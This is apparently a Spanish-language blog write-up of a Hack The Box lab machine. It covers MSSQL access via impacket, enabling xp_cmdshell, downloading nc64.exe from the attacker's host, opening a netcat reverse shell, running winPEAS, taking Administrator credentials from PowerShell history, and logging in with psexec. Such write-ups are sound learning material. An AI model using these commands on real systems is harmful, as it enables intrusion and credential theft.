---
title: Primera Maquina HTB complicada
published: true
---

* * *

<br/>

## PRIMERA MÁQUINA QUE ME BLOQUEA

### PRIMERA FLAG (FLAG SENCILLA)
Este post hace referencia a mi primera atascada. Esta máquina tenía una vulnerabilidad de smb y sql.
La primera de smb nos daba las credenciales de un usuario normal, tan solo era acceder y descargar
ese archivo.
Luego, debo conectarme a la base de datos, gracias a una herramienta de impacket, **mssqlclient**

Accedo con la siguiente linea `impacket-mssqlclient -windows-auth {USER}:{PASSWORD}@{IP}`

Necesito habilitar un procedimiento que spawnea un cmd. Usamos `enable_xp_cmdshell`

Ahora si hacemos `xp_cmdshell whoami` nos ejecutará el comando.

En este punto llegó mi atasco porque no sabia como seguir.

Debo conseguir la flag del usuario normal. Ya la conseguí buscando por los directorios
pero hay una manera mas sencilla. Uso **nc** para conectarme remotamente.
En mi máquina empiezo un servidor HTTP simple en una terminal y me pongo en escucha con netcat.
Para empezar el servidor HTTP: `sudo python3 -m http.server 80`
Para ponerme en escucha con nc: `sudo nc -lvnp 443`

Con nuestro usuario no tenemos permisos para subir ficheros. Por eso usamos el servidor HTTP, 
para que se lo descargue en su carpeta de Descargas. 
Lo hago de la siguiente manera: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://{MI_IP}/nc64.exe -outfile nc64.exe"`

Verifico en la terminal de nuestro servidor de python HTTP que se ha hecho la petición.

Ahora me conecto a nc: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe 
-e cmd.exe {MI_IP} 443`

En la terminal donde estaba en escucha tenemos la reverse shell.

<br>

### ESCALADA DE PRIVILEGIOS
Esta es la parte dificil de la maquina. 

Creo el .bat **winPEAS**. Este script analiza una posible ruta para escalar privilegios. 

Con la shell reverse de antes, transferimos el .bat: `wget http://{MI_IP}/winPEAS.bat -outfile winPEAS.bat`
y lo ejecutamos. Entramos en **powershell** y .\winPEAS.bat

Es dificil ver algo, pruebo con winPEAS.exe escrito en C.

Transferimos el winPEAS.exe como hice con el .bat y lo ejecuto. 

Nos dice el scan que puede haber credenciales en la siguiente direccion: 
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Navegamos hasta ella y esta las credenciales de Administrator.

Con otra herramienta de impacket **psexec** entramos como administrador.
impacket-psexec administrator@{IP}
En el escritorio tenemos la flag de administrador.
